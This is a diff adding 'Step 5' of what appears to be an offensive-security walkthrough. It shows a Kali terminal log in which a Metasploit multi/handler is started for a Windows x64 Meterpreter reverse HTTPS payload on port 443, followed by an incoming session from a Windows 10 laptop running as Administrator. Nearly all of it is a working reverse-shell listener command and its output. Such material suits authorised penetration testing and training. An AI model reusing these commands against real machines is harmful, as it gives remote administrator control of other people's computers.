@@ -163,3 +163,79 @@ Copyright (C) Microsoft Corporation. All rights reserved.
 ------------------------------------------------------------------------------------------------------------------------------------
 Step 5 - Enjoy the Meterpreter reverse shell running on the target Windows 10 laptop 
 ------------------------------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST 192.168.1.30; set LPORT 443;
+set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true; run -j"[sudo] password for jeff: 
+
+[!] The following modules were loaded with warnings:
+[!]     /usr/share/metasploit-framework/modules/encoders/x86/bf_xor.rb
+[!] Please see /root/.msf4/logs/framework.log for details.
+                                                  
+  +-------------------------------------------------------+
+  |  METASPLOIT by Rapid7                                 |
+  +---------------------------+---------------------------+
+  |      __________________   |                           |
+  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
+  |             )=\           | |  EXPLOIT   \            |
+  |            // \\          | |_____________\_______    |
+  |           //   \\         | |==[msf >]============\   |
+  |          //     \\        | |______________________\  |
+  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |
+  |        //         \\      |  *********************    |
+  +---------------------------+---------------------------+
+  |      o O o                |        \'\/\/\/'/         |
+  |              o O          |         )======(          |
+  |                 o         |       .'  LOOT  '.        |
+  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
+  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
+  | |________________|__|)__| |    |     __||_)     |     |
+  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
+  |  = = = = = = = = = = = =  |     '--------------'      |
+  +---------------------------+---------------------------+
+
+
+       =[ metasploit v6.1.14-dev                          ]
++ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
++ -- --=[ 596 payloads - 46 encoders - 10 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Display the Framework log using the 
+log command, learn more with help log
+                                                                                                                                                           
+[*] Starting persistent handler(s)...                                                                                                                      
+[*] Using configured payload generic/shell_reverse_tcp                                                                                                     
+PAYLOAD => windows/x64/meterpreter_reverse_https                                                                                                           
+LHOST => 192.168.1.30                                                                                                                                      
+LPORT => 443                                                                                                                                               
+EXITFUNC => thread                                                                                                                                         
+ExitOnSession => false                                                                                                                                     
+SessionCommunicationTimeout => 0                                                                                                                           
+EnableUnicodeEncoding => true                                                                                                                              
+[*] Exploit running as background job 0.                                                                                                                   
+[*] Exploit completed, but no session was created.                                                                                                         
+msf6 exploit(multi/handler) >                                                                                                                              
+msf6 exploit(multi/handler) >                                                                                                                              
+[*] Started HTTPS reverse handler on https://192.168.1.30:443                                                                                              
+
+msf6 exploit(multi/handler) > 
+
+[*] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: p4tvt6er) Redirecting stageless connection from /jrHfVIB6ujjTu9K5sAPl7gYm4aOHMNR_Ajk0xtxURr2Sb with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
+[*] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: p4tvt6er) Attaching orphaned/stageless session...
+[*] Meterpreter session 3 opened (192.168.1.30:443 -> 127.0.0.1 ) at 2023-01-06 15:55:21 +0100
+
+msf6 exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                        Connection
+  --  ----  ----                     -----------                        ----------
+  1         meterpreter x64/windows  Laptop1\Administrator @ Laptop1  192.168.1.30:443 -> 127.0.0.1  (192.168.1.113)
+
+msf6 exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 3...
+
+meterpreter > getuid
+Server username: Laptop1\Administrator
+
+<SNIP>
